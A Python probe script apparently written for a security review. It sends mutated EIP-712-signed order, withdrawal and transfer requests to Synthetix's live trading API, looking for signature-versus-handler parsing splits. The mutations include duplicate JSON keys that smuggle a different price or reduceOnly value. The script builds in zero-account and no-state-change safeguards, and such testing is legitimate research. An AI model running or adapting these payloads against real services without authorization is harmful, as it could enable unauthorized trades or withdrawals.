#!/usr/bin/env python3
"""Controlled EIP-712 verifier/handler parser-coercion differential for Synthetix PAPI.

Safety constraints:
- deterministic EOA confirmed to own/manage/delegate zero Synthetix accounts;
- deliberately nonexistent valid-range account IDs;
- `placeOrders`, `withdrawCollateral`, and `transferCollateral` requests cannot pass ownership;
- every case uses a fresh nonce and an impossible/no-value payload, so no state can change;
- fixed low-noise matrix, redacted output, and no real account identifiers.

Goal: detect values that are normalized one way by EIP-712 signature verification but interpreted a
different way by the business handler (booleans, decimal strings, uint encodings, omitted/null fields,
and duplicate JSON keys). Such a split could let an intercepted signature authorize materially
different order or withdrawal semantics.
"""
from __future__ import annotations

import hashlib
import json
import pathlib
import re
import time
import urllib.error
import urllib.request
from copy import deepcopy
from dataclasses import dataclass
from typing import Any, Callable

from eth_account import Account
from eth_account.messages import encode_typed_data

OUT = pathlib.Path("parser_coercion")
OUT.mkdir(parents=True, exist_ok=True)

TRADE = "https://papi.synthetix.io/v1/trade"
INFO = "https://papi.synthetix.io/v1/info"
UA = "Mozilla/5.0 (compatible; authorized-synthetic-security-review/1.0)"
ATTACKER = Account.from_key("0x" + "d4" * 32)
ACCOUNT_A = 8_300_000_000_010_001
ACCOUNT_B = 8_300_000_000_010_002
ZERO = "0x0000000000000000000000000000000000000000"
DEST = ATTACKER.address
MAX_BODY = 2 * 1024 * 1024
ADDRESS_RE = re.compile(r"0x[a-fA-F0-9]{40}")

DOMAIN = {"name": "Synthetix", "version": "1", "chainId": 1, "verifyingContract": ZERO}
DOMAIN_FIELDS = [
    {"name": "name", "type": "string"},
    {"name": "version", "type": "string"},
    {"name": "chainId", "type": "uint256"},
    {"name": "verifyingContract", "type": "address"},
]
ORDER_FIELDS = [
    {"name": "symbol", "type": "string"},
    {"name": "side", "type": "string"},
    {"name": "orderType", "type": "string"},
    {"name": "price", "type": "string"},
    {"name": "triggerPrice", "type": "string"},
    {"name": "quantity", "type": "string"},
    {"name": "reduceOnly", "type": "bool"},
    {"name": "isTriggerMarket", "type": "bool"},
    {"name": "clientOrderId", "type": "string"},
    {"name": "closePosition", "type": "bool"},
]
PLACE_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "orders", "type": "Order[]"},
    {"name": "grouping", "type": "string"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
WITHDRAW_FIELDS = [
    {"name": "subAccountId", "type": "uint256"},
    {"name": "symbol", "type": "string"},
    {"name": "amount", "type": "string"},
    {"name": "destination", "type": "address"},
    {"name": "nonce", "type": "uint256"},
    {"name": "expiresAfter", "type": "uint256"},
]
TRANSFER_FIELDS = [
    {"name": "amount", "type": "string"},
    {"name": "expiresAfter", "type": "uint256"},
    {"name": "nonce", "type": "uint256"},
    {"name": "subAccountId", "type": "uint256"},
    {"name": "symbol", "type": "string"},
    {"name": "to", "type": "uint256"},
]

ORDER = {
    "symbol": "BTC-USDT",
    "side": "buy",
    "orderType": "limitGtc",
    "price": "1",
    "triggerPrice": "",
    "quantity": "0.001",
    "reduceOnly": False,
    "isTriggerMarket": False,
    "clientOrderId": "0x" + "ab" * 16,
    "closePosition": False,
}


def digest(value: str | bytes) -> str:
    if isinstance(value, str):
        value = value.encode()
    return hashlib.sha256(value).hexdigest()


def redact(value: Any) -> str | None:
    if value is None:
        return None
    text = ADDRESS_RE.sub("<address>", str(value))
    text = re.sub(r"0x[a-fA-F0-9]{64,}", "<hex>", text)
    text = re.sub(r"\b\d{12,}\b", "<large-number>", text)
    return text[:1200]


def post(url: str, body: bytes) -> tuple[int, bytes, dict[str, str], float]:
    req = urllib.request.Request(
        url,
        data=body,
        headers={"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    started = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=45) as response:
            raw = response.read(MAX_BODY + 1)
            status = response.status
            headers = dict(response.headers.items())
    except urllib.error.HTTPError as exc:
        raw = exc.read(MAX_BODY + 1)
        status = exc.code
        headers = dict(exc.headers.items()) if exc.headers else {}
    if len(raw) > MAX_BODY:
        raise RuntimeError("response exceeds safety cap")
    return status, raw, headers, time.monotonic() - started


def json_post(url: str, payload: dict[str, Any]) -> tuple[int, Any]:
    status, raw, _, _ = post(url, json.dumps(payload, separators=(",", ":")).encode())
    try:
        return status, json.loads(raw)
    except Exception:
        return status, None


def account_count(response: Any) -> int | None:
    if isinstance(response, list):
        return len(response)
    if isinstance(response, dict):
        values: list[Any] = []
        recognized = False
        for key in ("subAccountIds", "managedSubAccountIds", "delegatedSubAccountIds"):
            item = response.get(key)
            if isinstance(item, list):
                recognized = True
                values.extend(item)
        return len(values) if recognized else None
    return None


def format_signature(signed: Any) -> dict[str, Any]:
    return {
        "v": signed.v,
        "r": "0x" + format(signed.r, "064x"),
        "s": "0x" + format(signed.s, "064x"),
    }


def sign(primary: str, types: dict[str, list[dict[str, str]]], message: dict[str, Any]) -> dict[str, Any]:
    encoded = encode_typed_data(
        full_message={"types": types, "primaryType": primary, "domain": DOMAIN, "message": message}
    )
    return format_signature(ATTACKER.sign_message(encoded))


@dataclass(frozen=True)
class Case:
    name: str
    family: str
    mutate: Callable[[dict[str, Any]], None] | None = None
    raw_builder: Callable[[dict[str, Any]], bytes] | None = None


def place_envelope(nonce: int) -> tuple[dict[str, Any], dict[str, Any]]:
    expiry = nonce + 60_000
    signed_message = {
        "subAccountId": ACCOUNT_A,
        "orders": [deepcopy(ORDER)],
        "grouping": "na",
        "nonce": nonce,
        "expiresAfter": expiry,
    }
    envelope = {
        "signature": sign(
            "PlaceOrders",
            {"EIP712Domain": DOMAIN_FIELDS, "Order": ORDER_FIELDS, "PlaceOrders": PLACE_FIELDS},
            signed_message,
        ),
        "nonce": nonce,
        "expiresAfter": expiry,
        "params": {
            "action": "placeOrders",
            "subaccountId": str(ACCOUNT_A),
            "walletAddress": ATTACKER.address,
            "orders": [deepcopy(ORDER)],
            "grouping": "na",
            "source": "synthetic-parser-control",
        },
    }
    return signed_message, envelope


def withdraw_envelope(nonce: int) -> tuple[dict[str, Any], dict[str, Any]]:
    expiry = nonce + 60_000
    signed_message = {
        "subAccountId": ACCOUNT_A,
        "symbol": "USDT",
        "amount": "1",
        "destination": DEST,
        "nonce": nonce,
        "expiresAfter": expiry,
    }
    envelope = {
        "signature": sign(
            "WithdrawCollateral",
            {"EIP712Domain": DOMAIN_FIELDS, "WithdrawCollateral": WITHDRAW_FIELDS},
            signed_message,
        ),
        "nonce": nonce,
        "expiresAfter": expiry,
        "params": {
            "action": "withdrawCollateral",
            "subaccountId": str(ACCOUNT_A),
            "walletAddress": ATTACKER.address,
            "symbol": "USDT",
            "amount": "1",
            "destination": DEST,
        },
    }
    return signed_message, envelope


def transfer_envelope(nonce: int) -> tuple[dict[str, Any], dict[str, Any]]:
    expiry = nonce + 60_000
    signed_message = {
        "amount": "1",
        "expiresAfter": expiry,
        "nonce": nonce,
        "subAccountId": ACCOUNT_A,
        "symbol": "USDT",
        "to": ACCOUNT_B,
    }
    envelope = {
        "signature": sign(
            "TransferCollateral",
            {"EIP712Domain": DOMAIN_FIELDS, "TransferCollateral": TRANSFER_FIELDS},
            signed_message,
        ),
        "nonce": nonce,
        "expiresAfter": expiry,
        "params": {
            "action": "transferCollateral",
            "subaccountId": str(ACCOUNT_A),
            "walletAddress": ATTACKER.address,
            "symbol": "USDT",
            "amount": "1",
            "to": str(ACCOUNT_B),
        },
    }
    return signed_message, envelope


def set_order_field(field: str, value: Any) -> Callable[[dict[str, Any]], None]:
    def mutate(env: dict[str, Any]) -> None:
        env["params"]["orders"][0][field] = value
    return mutate


def del_order_field(field: str) -> Callable[[dict[str, Any]], None]:
    def mutate(env: dict[str, Any]) -> None:
        env["params"]["orders"][0].pop(field, None)
    return mutate


def set_param(field: str, value: Any) -> Callable[[dict[str, Any]], None]:
    def mutate(env: dict[str, Any]) -> None:
        env["params"][field] = value
    return mutate


def del_param(field: str) -> Callable[[dict[str, Any]], None]:
    def mutate(env: dict[str, Any]) -> None:
        env["params"].pop(field, None)
    return mutate


def set_top(field: str, value_factory: Callable[[dict[str, Any]], Any] | Any) -> Callable[[dict[str, Any]], None]:
    def mutate(env: dict[str, Any]) -> None:
        env[field] = value_factory(env) if callable(value_factory) else value_factory
    return mutate


def raw_duplicate_order_key(env: dict[str, Any], field: str, first: str, second: str) -> bytes:
    # Only used with string and boolean literals controlled below. The signature covers the first
    # canonical value; the second duplicate tests whether verifier and handler choose different keys.
    order = env["params"]["orders"][0]
    pairs = []
    for key, value in order.items():
        if key == field:
            pairs.append(json.dumps(key) + ":" + first)
            pairs.append(json.dumps(key) + ":" + second)
        else:
            pairs.append(json.dumps(key) + ":" + json.dumps(value, separators=(",", ":")))
    params = dict(env["params"])
    params.pop("orders")
    params_json = json.dumps(params, separators=(",", ":"))[:-1] + ',"orders":[{' + ",".join(pairs) + "}]}"
    # remove the helper quote inserted after the closing object
    params_json = params_json[:-1]
    return (
        '{"signature":'
        + json.dumps(env["signature"], separators=(",", ":"))
        + ',"nonce":'
        + json.dumps(env["nonce"])
        + ',"expiresAfter":'
        + json.dumps(env["expiresAfter"])
        + ',"params":'
        + params_json
        + "}"
    ).encode()


CASES = [
    Case("place_canonical", "place"),
    Case("place_reduce_string_false", "place", set_order_field("reduceOnly", "false")),
    Case("place_reduce_numeric_zero", "place", set_order_field("reduceOnly", 0)),
    Case("place_reduce_null", "place", set_order_field("reduceOnly", None)),
    Case("place_reduce_omitted", "place", del_order_field("reduceOnly")),
    Case("place_trigger_string_false", "place", set_order_field("isTriggerMarket", "false")),
    Case("place_trigger_numeric_zero", "place", set_order_field("isTriggerMarket", 0)),
    Case("place_close_string_false", "place", set_order_field("closePosition", "false")),
    Case("place_close_numeric_zero", "place", set_order_field("closePosition", 0)),
    Case("place_price_number", "place", set_order_field("price", 1)),
    Case("place_price_decimal_equiv", "place", set_order_field("price", "1.0")),
    Case("place_price_leading_zero", "place", set_order_field("price", "01")),
    Case("place_price_exponent", "place", set_order_field("price", "1e0")),
    Case("place_price_whitespace", "place", set_order_field("price", " 1 ")),
    Case("place_quantity_number", "place", set_order_field("quantity", 0.001)),
    Case("place_quantity_exponent", "place", set_order_field("quantity", "1e-3")),
    Case("place_trigger_null", "place", set_order_field("triggerPrice", None)),
    Case("place_trigger_omitted", "place", del_order_field("triggerPrice")),
    Case("place_cloid_null", "place", set_order_field("clientOrderId", None)),
    Case("place_cloid_omitted", "place", del_order_field("clientOrderId")),
    Case("place_grouping_null", "place", set_param("grouping", None)),
    Case("place_grouping_omitted", "place", del_param("grouping")),
    Case("place_account_number", "place", set_param("subaccountId", ACCOUNT_A)),
    Case("place_account_hex", "place", set_param("subaccountId", hex(ACCOUNT_A))),
    Case("place_account_leading_zero", "place", set_param("subaccountId", "000" + str(ACCOUNT_A))),
    Case("place_nonce_string", "place", set_top("nonce", lambda env: str(env["nonce"]))),
    Case("place_expiry_string", "place", set_top("expiresAfter", lambda env: str(env["expiresAfter"]))),
    Case("place_extra_order_field", "place", set_order_field("unsignedExtra", "x")),
    Case(
        "place_duplicate_price_first_signed",
        "place",
        raw_builder=lambda env: raw_duplicate_order_key(env, "price", '"1"', '"1000000"'),
    ),
    Case(
        "place_duplicate_reduce_first_signed",
        "place",
        raw_builder=lambda env: raw_duplicate_order_key(env, "reduceOnly", "false", "true"),
    ),
    Case("withdraw_canonical", "withdraw"),
    Case("withdraw_amount_number", "withdraw", set_param("amount", 1)),
    Case("withdraw_amount_decimal_equiv", "withdraw", set_param("amount", "1.0")),
    Case("withdraw_amount_leading_zero", "withdraw", set_param("amount", "01")),
    Case("withdraw_amount_exponent", "withdraw", set_param("amount", "1e0")),
    Case("withdraw_amount_whitespace", "withdraw", set_param("amount", " 1 ")),
    Case("withdraw_destination_lower", "withdraw", set_param("destination", DEST.lower())),
    Case("withdraw_account_number", "withdraw", set_param("subaccountId", ACCOUNT_A)),
    Case("withdraw_account_hex", "withdraw", set_param("subaccountId", hex(ACCOUNT_A))),
    Case("transfer_canonical", "transfer"),
    Case("transfer_amount_number", "transfer", set_param("amount", 1)),
    Case("transfer_amount_decimal_equiv", "transfer", set_param("amount", "1.0")),
    Case("transfer_to_number", "transfer", set_param("to", ACCOUNT_B)),
    Case("transfer_to_hex", "transfer", set_param("to", hex(ACCOUNT_B))),
    Case("transfer_to_leading_zero", "transfer", set_param("to", "000" + str(ACCOUNT_B))),
]


def response_summary(case: Case, status: int, raw: bytes, headers: dict[str, str], elapsed: float) -> dict[str, Any]:
    try:
        parsed = json.loads(raw)
    except Exception:
        parsed = None
    error = parsed.get("error") if isinstance(parsed, dict) else None
    message = error.get("message") if isinstance(error, dict) else error
    code = error.get("code") if isinstance(error, dict) else None
    text = str(message) if message is not None else ""
    addresses = ADDRESS_RE.findall(text)
    return {
        "name": case.name,
        "family": case.family,
        "httpStatus": status,
        "elapsedMs": round(elapsed * 1000, 2),
        "apiStatus": parsed.get("status") if isinstance(parsed, dict) else None,
        "errorCode": code,
        "messageRedacted": redact(message),
        "messageSha256": digest(text) if text else None,
        "recoveredAddressHashes": sorted(digest(value.lower()) for value in addresses),
        "mentionsSyntheticSigner": ATTACKER.address.lower() in text.lower(),
        "bodySha256": digest(raw),
        "bodyBytes": len(raw),
        "rateLimit": parsed.get("rateLimit") if isinstance(parsed, dict) and isinstance(parsed.get("rateLimit"), dict) else None,
        "requestId": (parsed.get("request_id") if isinstance(parsed, dict) else None)
        or headers.get("X-Request-Id")
        or headers.get("x-request-id"),
    }


def main() -> None:
    status, parsed = json_post(
        INFO,
        {"params": {"action": "getSubAccountIds", "walletAddress": ATTACKER.address, "includeDelegations": True}},
    )
    response = parsed.get("response") if isinstance(parsed, dict) else None
    count = account_count(response)
    if status != 200 or count != 0:
        raise RuntimeError(f"Synthetic signer preflight failed: status={status}, accountCount={count}")

    results = []
    base_nonce = int(time.time() * 1000)
    for index, case in enumerate(CASES):
        nonce = base_nonce + index * 10 + 1
        if case.family == "place":
            _, env = place_envelope(nonce)
        elif case.family == "withdraw":
            _, env = withdraw_envelope(nonce)
        elif case.family == "transfer":
            _, env = transfer_envelope(nonce)
        else:
            raise AssertionError(case.family)
        if case.mutate is not None:
            case.mutate(env)
        body = case.raw_builder(env) if case.raw_builder is not None else json.dumps(env, separators=(",", ":")).encode()
        result = post(TRADE, body)
        results.append(response_summary(case, *result))
        if index + 1 < len(CASES):
            time.sleep(0.35)

    baseline_by_family = {
        "place": next(item for item in results if item["name"] == "place_canonical"),
        "withdraw": next(item for item in results if item["name"] == "withdraw_canonical"),
        "transfer": next(item for item in results if item["name"] == "transfer_canonical"),
    }
    same_signer = []
    different_stage = []
    for item in results:
        baseline = baseline_by_family[item["family"]]
        if item["name"] == baseline["name"]:
            continue
        if item["mentionsSyntheticSigner"]:
            same_signer.append(item["name"])
        if item["messageSha256"] != baseline["messageSha256"] or item["httpStatus"] != baseline["httpStatus"]:
            different_stage.append(item["name"])

    output = {
        "safety": "Synthetic zero-account signer; nonexistent accounts; fresh nonces; no request can mutate state.",
        "syntheticAddress": ATTACKER.address,
        "syntheticAccountCount": count,
        "caseCount": len(results),
        "baselineByFamily": baseline_by_family,
        "mutationsRecoveringSyntheticSigner": same_signer,
        "mutationsChangingValidationStage": different_stage,
        "results": results,
    }
    (OUT / "summary.json").write_text(json.dumps(output, indent=2, sort_keys=True), encoding="utf-8")
    print(
        json.dumps(
            {
                "caseCount": len(results),
                "mutationsRecoveringSyntheticSigner": same_signer,
                "mutationsChangingValidationStage": different_stage,
                "statuses": {item["name"]: item["httpStatus"] for item in results},
            },
            indent=2,
        )
    )


if __name__ == "__main__":
    main()
